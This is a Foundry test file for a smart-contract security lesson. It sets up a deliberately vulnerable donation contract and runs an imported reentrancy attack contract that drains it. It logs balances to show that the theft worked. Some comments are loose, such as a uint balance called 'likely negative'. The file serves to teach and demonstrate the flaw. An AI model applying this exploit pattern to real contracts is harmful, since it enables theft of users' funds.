// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "@/02_security/Reentrancy.sol";
import {ReentrancyAttack} from "@/02_security/Reentrancy.sol";

/**
 * @title ReentrancyTest
 * @notice Forge test demonstrating a classic reentrancy exploit where a malicious contract
 * recursively calls the vulnerable withdraw() function before state changes are applied
 */
contract ReentrancyTest is Test {
    Reentrance donation;
    address userAttacker;
    address normalUser;

    /**
     * @notice Sets up test environment:
     * - Deploys the vulnerable Reentrance contract
     * - Funds both attacker and normal user with 1 ether
     */
    function setUp() public {
        donation = new Reentrance();

        userAttacker = makeAddr("userAttacker");
        normalUser = makeAddr("normalUser");

        vm.deal(userAttacker, 1 ether);
        vm.deal(normalUser, 1 ether);
    }

    /**
     * @notice Executes a successful reentrancy attack.
     * Attacker drains all funds from the donation contract.
     */
    function test_Reentrancy() public {
        int256 attackAmount = 1 ether;

        // Step 1: Normal user donates 1 ether
        vm.prank(normalUser);
        donation.donate{value: 1 ether}(normalUser); // Stored safely

        // Step 2: Attacker deploys malicious contract, configured with attack amount
        vm.prank(userAttacker);
        ReentrancyAttack attackContract = new ReentrancyAttack(
            payable(address(donation)),
            attackAmount
        );

        // Step 3: Attacker donates 1 ether *through their contract*
        vm.prank(userAttacker);
        donation.donate{value: 1 ether}(address(attackContract));

        // Step 4: Log initial balances
        console.log(
            "Attack contract balance: ",
            address(attackContract).balance
        ); // Should be 0
        console.log("donation contract balance: ", address(donation).balance); // Should be 2 ether
        console.log("normal user balance: ", donation.balanceOf(normalUser)); // 1 ether
        console.log(
            "attacker contract user balance: ",
            donation.balanceOf(address(attackContract))
        ); // 1 ether

        // Step 5: Start the reentrancy attack via vulnerable withdraw()
        vm.prank(userAttacker);
        attackContract.attack();

        // Step 6: Log final balances
        console.log(
            "Attack contract balance: ",
            address(attackContract).balance
        ); // Likely 2 ether if drained successfully

        console.log("donation contract balance: ", address(donation).balance); // 0 (fully drained)
        console.log("normal user balance: ", donation.balanceOf(normalUser)); // Still 1 ether, but can no longer withdraw
        console.log(
            "attacker contract user balance: ",
            donation.balanceOf(address(attackContract))
        ); // Likely negative or 0
    }
}
